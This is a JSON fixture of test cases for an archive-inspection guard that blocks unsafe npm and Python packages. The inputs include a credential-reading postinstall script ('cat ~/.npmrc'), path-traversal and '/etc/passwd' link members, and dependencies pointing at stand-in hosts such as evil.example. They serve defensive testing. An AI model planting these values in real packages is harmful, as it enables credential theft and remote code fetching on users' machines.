{
  "schema": "hol-guard.native-archive-inspection.v1",
  "version": 1,
  "note": "Language-neutral archive-inspection expectations derived from tests/test_native_archive_inspection.py. kind=member-policy cases are consumable by guard-archive tar_policy tests (members + expected status/code); kind=blob-fault and kind=transport-fault cases encode adapter/worker-boundary expectations for the caller-side harness.",
  "request_schema": "guard-archive-inspection.v1",
  "result_schema": "guard-archive-inspection-result.v1",
  "caps": {"max_archive_bytes": 6291456, "max_files": 500, "max_expanded_bytes": 33554432, "max_member_bytes": 8388608, "max_package_json_bytes": 262144, "max_memory_bytes": 536870912, "max_decompression_ratio": 200.0, "max_nested_archives": 8, "max_path_depth": 64},
  "cases": [
    {"id": "clean-digest-bound", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "safe-package", "version": "1.0.0"}}], "expected_status": "clean", "expected_code": "external_archive_inspection_clean"},
    {"id": "parent-path-member", "kind": "member-policy", "members": [{"name": "../escape.sh", "content": "echo unsafe"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "absolute-member", "kind": "member-policy", "members": [{"name": "/etc/payload", "content": "x"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "install-script-postinstall", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "scripts": {"postinstall": "touch marker"}}}], "expected_status": "blocked", "expected_code": "tarball_install_script", "side_effect": "marker must not be created"},
    {"id": "lifecycle-prepublish", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "scripts": {"prepublish": "x"}}}], "expected_status": "blocked", "expected_code": "tarball_install_script"},
    {"id": "lifecycle-preprepare", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "scripts": {"preprepare": "x"}}}], "expected_status": "blocked", "expected_code": "tarball_install_script"},
    {"id": "lifecycle-postprepare", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "scripts": {"postprepare": "x"}}}], "expected_status": "blocked", "expected_code": "tarball_install_script"},
    {"id": "credential-theft-install-script", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "scripts": {"postinstall": "cat ~/.npmrc"}}}], "expected_status": "blocked", "expected_code": "credential_theft_install_script"},
    {"id": "invalid-package-manifest", "kind": "member-policy", "members": [{"name": "package/package.json", "content": "{not json"}], "expected_status": "blocked", "expected_code": "external_archive_manifest_invalid"},
    {"id": "invalid-dependency-declaration", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "x", "dependencies": [1, 2, 3]}}], "expected_status": "blocked", "expected_code": "external_archive_manifest_invalid"},
    {"id": "python-sdist-setup-py", "kind": "member-policy", "members": [{"name": "demo/setup.py", "content": "open('python-build-marker','w')"}], "expected_status": "blocked", "expected_code": "python_build_script_risk", "side_effect": "marker must not be created"},
    {"id": "setup-py-always-build-metadata", "kind": "member-policy", "members": [{"name": "demo/setup.py", "content": "from setuptools import setup\nsetup()\n"}], "expected_status": "blocked", "expected_code": "python_build_script_risk"},
    {"id": "local-python-build-backend", "kind": "member-policy", "members": [{"name": "pkg/pyproject.toml", "content": "[build-system]\nrequires=[]\nbuild-backend=\"backend\"\nbackend-path=[\".\"]\n"}], "expected_status": "blocked", "expected_code": "python_build_backend_risk"},
    {"id": "remote-python-build-requirement", "kind": "member-policy", "members": [{"name": "pkg/pyproject.toml", "content": "[build-system]\nrequires=[\"evil @ https://packages.example.com/backend.whl\"]\nbuild-backend=\"evil\"\n"}], "expected_status": "blocked", "expected_code": "python_build_backend_risk"},
    {"id": "node-gyp-implicit-install", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "native-package", "version": "1.0.0"}}, {"name": "package/binding.gyp", "json": {"targets": [{"target_name": "unsafe", "actions": [{"action": ["sh", "-c", "echo must-not-run"]}]}]}}], "expected_status": "blocked", "expected_code": "node_gyp_implicit_install_script"},
    {"id": "nested-source-https", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "https://evil.example/payload.tgz"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-file", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "file:./payload.tgz"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-git", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "attacker/repository#main"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-npm-alias-url", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "npm:evil@https://evil.example/payload.tgz"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-exec", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "exec:./generator.js"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-jsr", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "jsr:@scope/payload@1.0.0"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "nested-source-unknown-protocol", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "unknown-protocol:payload"}}}], "expected_status": "blocked", "expected_code": "external_archive_nested_source_dependency"},
    {"id": "registry-spec-caret", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "^1.2.3"}}}], "expected_status": "clean"},
    {"id": "registry-spec-latest", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "latest"}}}], "expected_status": "clean"},
    {"id": "registry-spec-npm-alias-range", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "npm:safe-package@^1.2.3"}}}], "expected_status": "clean"},
    {"id": "registry-spec-npm-alias-scoped", "kind": "member-policy", "members": [{"name": "package/package.json", "json": {"name": "outer", "dependencies": {"nested": "npm:@scope/safe@latest"}}}], "expected_status": "clean"},
    {"id": "digest-mismatch", "kind": "transport-fault", "fault": "expected_sha256 '0'*64 vs real digest", "expected_status": "blocked", "expected_code": "external_archive_digest_mismatch"},
    {"id": "symlink-blob", "kind": "blob-fault", "fault": "archive path is a symlink", "expected_status": "blocked", "expected_code": "external_archive_blob_rejected"},
    {"id": "writable-blob", "kind": "blob-fault", "fault": "archive chmod 0644 (expected 0400)", "expected_status": "blocked", "expected_code": "external_archive_blob_rejected"},
    {"id": "missing-blob", "kind": "blob-fault", "fault": "archive path does not exist", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "directory-blob", "kind": "blob-fault", "fault": "archive path is a directory", "expected_status": "blocked", "expected_code": "external_archive_blob_rejected"},
    {"id": "hardlinked-blob", "kind": "blob-fault", "fault": "archive nlink>1", "expected_status": "blocked", "expected_code": "external_archive_blob_rejected"},
    {"id": "blob-under-symlinked-temp-root", "kind": "blob-fault", "fault": "symlinked ancestor dir, regular blob", "expected_status": "clean"},
    {"id": "escaping-symlink-member", "kind": "member-policy", "members": [{"name": "package/link", "type": "sym", "linkname": "../../etc/passwd"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "escaping-hardlink-member", "kind": "member-policy", "members": [{"name": "package/link", "type": "lnk", "linkname": "../../etc/passwd"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "hardlink-missing-target", "kind": "member-policy", "members": [{"name": "package/nested/link.txt", "type": "lnk", "linkname": "package/absent.txt"}], "expected_status": "blocked", "expected_code": "external_archive_unsafe_hardlink"},
    {"id": "special-device-member", "kind": "member-policy", "members": [{"name": "package/device", "type": "chr"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "fifo-member", "kind": "member-policy", "members": [{"name": "package/pipe", "type": "fifo"}], "expected_status": "blocked", "expected_code": "tarball_zip_slip"},
    {"id": "duplicate-member-path", "kind": "member-policy", "members": [{"name": "package/value.txt", "content": "one"}, {"name": "package/value.txt", "content": "two"}], "expected_status": "blocked", "expected_code": "external_archive_path_conflict"},
    {"id": "portable-case-collision", "kind": "member-policy", "members": [{"name": "package/value.txt", "content": "one"}, {"name": "PACKAGE/VALUE.TXT", "content": "two"}], "expected_status": "blocked", "expected_code": "external_archive_path_conflict"},
    {"id": "file-over-directory", "kind": "member-policy", "members": [{"name": "package", "type": "dir"}, {"name": "package", "content": "x"}], "expected_status": "blocked", "expected_code": "external_archive_path_conflict"},
    {"id": "root-relative-hardlink-target", "kind": "member-policy", "members": [{"name": "package/target.txt", "content": "x"}, {"name": "package/link.txt", "type": "lnk", "linkname": "package/target.txt"}], "expected_status": "clean", "expected_code": "external_archive_inspection_clean"},
    {"id": "linked-package-manifest", "kind": "member-policy", "members": [{"name": "package/real.json", "json": {"scripts": {"postinstall": "echo unsafe"}}}, {"name": "package/package.json", "type": "lnk", "linkname": "package/real.json"}], "expected_status": "blocked", "expected_code": "external_archive_manifest_link"},
    {"id": "decompression-ratio", "kind": "member-policy", "members": [{"name": "package/repeated.txt", "content_repeat": ["A", 16384]}], "expected_status": "blocked", "expected_code": "external_archive_decompression_ratio_limit"},
    {"id": "member-size-limit", "kind": "member-policy", "members": [{"name": "package/big.bin", "content_repeat": ["B", 4096]}], "caps_override": {"max_member_bytes": 1024}, "expected_status": "blocked", "expected_code": "external_archive_member_size_limit"},
    {"id": "expanded-size-limit", "kind": "member-policy", "members": [{"name": "package/big.bin", "content_repeat": ["B", 4096]}], "caps_override": {"max_expanded_bytes": 1024}, "expected_status": "blocked", "expected_code": "external_archive_expanded_size_limit"},
    {"id": "package-json-size-limit", "kind": "member-policy", "members": [{"name": "package/package.json", "json_padding": {"name": "x", "padding": "p*4096"}}], "caps_override": {"max_package_json_bytes": 1024}, "expected_status": "blocked", "expected_code": "tarball_package_json_limit"},
    {"id": "path-depth-limit", "kind": "member-policy", "members": [{"name": "a/b/c/deep.txt", "content": "deep"}], "caps_override": {"max_path_depth": 2}, "expected_status": "blocked", "expected_code": "external_archive_path_depth_limit"},
    {"id": "unsupported-bzip2", "kind": "member-policy", "archive_format": "tar.bz2", "members": [{"name": "package/readme.txt", "content": "safe"}], "expected_status": "blocked", "expected_code": "external_archive_unsupported_format"},
    {"id": "unsupported-xz", "kind": "member-policy", "archive_format": "tar.xz", "members": [{"name": "package/readme.txt", "content": "safe"}], "expected_status": "blocked", "expected_code": "external_archive_unsupported_format"},
    {"id": "file-count-limit", "kind": "member-policy", "caps_override": {"max_files": 1}, "members": [{"name": "a.txt", "content": "x"}, {"name": "b.txt", "content": "y"}], "expected_status": "blocked", "expected_code": "tarball_file_count_limit"},
    {"id": "nesting-limit", "kind": "member-policy", "caps_override": {"max_nested_archives": 0}, "members": [{"name": "package/inner.tgz", "nested_archive": true}], "expected_status": "blocked", "expected_code": "external_archive_nesting_limit"},
    {"id": "archive-size-limit", "kind": "member-policy", "caps_override": {"max_archive_bytes": 64}, "members": [{"name": "package/readme.txt", "content": "safe"}], "expected_status": "blocked", "expected_code": "external_archive_download_size_limit"},
    {"id": "malformed-archive", "kind": "blob-fault", "fault": "not a tar/gzip at all", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "truncated-gzip", "kind": "blob-fault", "fault": "gzip truncated mid-stream", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "invalid-request-policy", "kind": "transport-fault", "fault": "expected_sha256 'not-hex' rejected at request validation", "expected_status": "error-before-worker"},
    {"id": "native-unavailable", "kind": "transport-fault", "fault": "native runtime identity absent", "expected_status": "incomplete", "expected_code": "external_archive_native_unavailable"},
    {"id": "worker-cannot-start", "kind": "transport-fault", "fault": "spawn failure", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "worker-timeout", "kind": "transport-fault", "fault": "worker exceeds deadline", "expected_status": "incomplete", "expected_code": "external_archive_inspection_timeout"},
    {"id": "worker-crash", "kind": "transport-fault", "fault": "worker exits nonzero mid-request", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "malformed-worker-output", "kind": "transport-fault", "fault": "worker emits non-result-schema bytes", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "unverified-clean-result", "kind": "transport-fault", "fault": "forged clean result rejected (digest/proof unverified)", "expected_status": "incomplete", "expected_code": "external_archive_inspection_incomplete"},
    {"id": "lease-held", "kind": "transport-fault", "fault": "archive-inspect.lock held by another inspector", "expected_status": "incomplete", "expected_code": "external_archive_inspection_overloaded"},
    {"id": "orphaned-worker", "kind": "transport-fault", "fault": "supervising parent dies before worker finishes; no clean result into abandoned pipe", "expected_status": "abort-no-result"},
    {"id": "closed-liveness-channel", "kind": "transport-fault", "fault": "PARENT_LIVENESS_FD already closed at start", "expected_status": "incomplete", "expected_code": "external_archive_inspection_orphaned"}
  ]
}